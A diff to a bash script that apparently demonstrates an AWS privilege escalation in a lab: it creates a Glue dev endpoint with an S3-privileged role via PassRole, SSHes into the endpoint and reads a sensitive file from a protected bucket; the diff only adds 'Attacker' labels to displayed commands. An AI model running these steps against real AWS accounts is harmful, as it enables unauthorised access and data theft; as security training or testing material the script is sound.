@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -96,7 +98,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -108,7 +110,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -126,7 +128,7 @@ fi
 
 echo "Target bucket: $BUCKET_NAME"
 echo "Attempting to access bucket: $BUCKET_NAME"
-show_cmd aws s3 ls s3://$BUCKET_NAME
+show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME"
 if aws s3 ls s3://$BUCKET_NAME &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -163,7 +165,7 @@ echo "This is the privilege escalation vector - passing the S3-privileged role t
 echo -e "${YELLOW}Creating endpoint (this may take 5-10 minutes)...${NC}"
 
 # Create the dev endpoint
-show_attack_cmd aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME --role-arn $ROLE_ARN --public-key "$SSH_PUBLIC_KEY" --glue-version "1.0" --number-of-nodes 2 --region $AWS_REGION --output json
+show_attack_cmd "Attacker" "aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME --role-arn $ROLE_ARN --public-key "$SSH_PUBLIC_KEY" --glue-version "1.0" --number-of-nodes 2 --region $AWS_REGION --output json"
 aws glue create-dev-endpoint \
     --endpoint-name $ENDPOINT_NAME \
     --role-arn $ROLE_ARN \
@@ -224,7 +226,7 @@ fi
 
 # Step 8: Get endpoint SSH address
 echo -e "${YELLOW}Step 8: Retrieving endpoint connection details${NC}"
-show_cmd aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text
+show_cmd "Attacker" "aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text"
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --endpoint-name $ENDPOINT_NAME \
     --region $AWS_REGION \
@@ -263,7 +265,7 @@ while [ $SSH_RETRY -lt $MAX_SSH_RETRIES ]; do
     echo "Attempting SSH connection (attempt $((SSH_RETRY + 1))/$MAX_SSH_RETRIES)..."
 
     # Execute AWS CLI command on the endpoint to read the sensitive file
-    show_attack_cmd aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -
+    show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -"
     SENSITIVE_DATA=$(ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
         "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -" 2>/dev/null || echo "")
 
@@ -305,7 +307,7 @@ echo -e "${YELLOW}Step 12: Listing bucket contents to demonstrate full access${N
 echo "Listing all objects in bucket..."
 echo ""
 
-show_attack_cmd aws s3 ls s3://$BUCKET_NAME/
+show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
     "aws s3 ls s3://$BUCKET_NAME/"
 
